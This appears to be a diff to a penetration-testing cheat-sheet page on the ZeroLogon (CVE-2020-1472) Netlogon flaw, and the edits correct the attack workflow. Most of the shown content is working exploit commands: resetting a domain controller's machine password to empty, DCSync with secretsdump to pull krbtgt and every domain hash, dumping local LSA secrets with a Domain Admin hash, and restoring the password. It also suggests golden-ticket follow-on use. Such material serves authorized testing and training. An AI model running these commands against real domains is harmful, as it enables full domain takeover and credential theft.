@@ -20,29 +20,35 @@ ZeroLogon is a flaw in the **Netlogon** secure-channel protocol (MS-NRPC): its s
 #    (the public exploit sets DC$'s AD password to an empty string)
 cve-2020-1472-exploit.py <DC-netbios-name> <dc-ip>
 
-# 2. Authenticate as the DC machine account with the now-empty hash and DCSync
+# 2. DCSync as the DC machine account (now empty) to recover a Domain Admin hash
 secretsdump.py -just-dc -no-pass 'EXAMPLE/DC01$@<dc-ip>'
-# -> krbtgt and every domain hash
+# -> krbtgt and every domain hash, including a Domain Admin NT hash
 ```
 
 ```bash
-# NetExec can both check and exploit
+# NetExec only DETECTS the flaw (reports VULNERABLE); it does not perform the reset
 nxc smb <dc> -u '' -p '' -M zerologon
 ```
 
 ## Restore the password, or you break the domain
 
-The reset changes the password **in AD only**; the DC still has its original password in its local registry (`$MACHINE.ACC` / LSA secrets), so the two now disagree. Left like that, the DC cannot authenticate and the domain breaks. **Restore** the original password after dumping:
+The reset changes the password **in AD only**; the DC still has its original password in its local registry (`$MACHINE.ACC` / LSA secrets), so the two now disagree. Left like that, the DC cannot authenticate and the domain breaks. The DCSync above reads **AD**, where the password is already empty, so it does **not** give you the original value. Recover it from the DC's **local** secrets, then set it back:
 
 ```bash
-# From the dump, recover the DC's original plain_password_hex (LSA secrets) and set it back
-restorepassword.py -target-ip <dc-ip> 'EXAMPLE/DC01$'@<DC-netbios> -hexpass <plain_password_hex>
+# 3. With the recovered Domain Admin hash, dump the DC's LOCAL secrets
+#    (the local registry still holds the original machine password)
+secretsdump.py 'EXAMPLE/Administrator@<dc-ip>' -hashes :<domain-admin-nt-hash>
+#    -> read plain_password_hex ($MACHINE.ACC) from the local LSA secrets output
+
+# 4. Restore the original password (restorepassword.py appends the trailing $ itself,
+#    so the account name is DC01, not DC01$)
+restorepassword.py 'EXAMPLE/DC01@<DC-netbios>' -target-ip <dc-ip> -hexpass <plain_password_hex>
 ```
 
 ## Exploitation notes
 
 - The payoff is immediate **domain compromise** with no credentials, which is why ZeroLogon was so severe; a patched DC enforces secure RPC and rejects the all-zero session.
-- **Always restore**: skipping the restore locks the DC out of the domain and is both destructive and a loud failure. Capture the original password (from LSA secrets in the dump) before you need it.
+- **Always restore**: skipping the restore locks the DC out of the domain and is both destructive and a loud failure. The original value comes from the DC's **local** secrets dump (step 3), not the AD DCSync, so recover it before you need it.
 - dirkjanm's variant **relays** the Netlogon authentication instead of resetting the password, avoiding the destructive reset entirely, prefer it where available to stay non-destructive.
 - After dumping, use the recovered [NTDS](ntds-and-dcsync.md) hashes (krbtgt for golden tickets, admins for direct access) rather than relying on the empty DC password, which you will have restored.
 
@@ -50,7 +56,7 @@ restorepassword.py -target-ip <dc-ip> 'EXAMPLE/DC01$'@<DC-netbios> -hexpass <pla
 
 - **cve-2020-1472 exploit / zerologon_tester** (SecuraBV, dirkjanm): check and set the empty password.
 - **Impacket** (`secretsdump.py -no-pass`, `restorepassword.py`): DCSync as DC$ and restore the password.
-- **NetExec `-M zerologon`**: detect and exploit from one tool.
+- **NetExec `-M zerologon`**: detect the flaw (reports vulnerable; does not reset the password).
 
 ## References
 
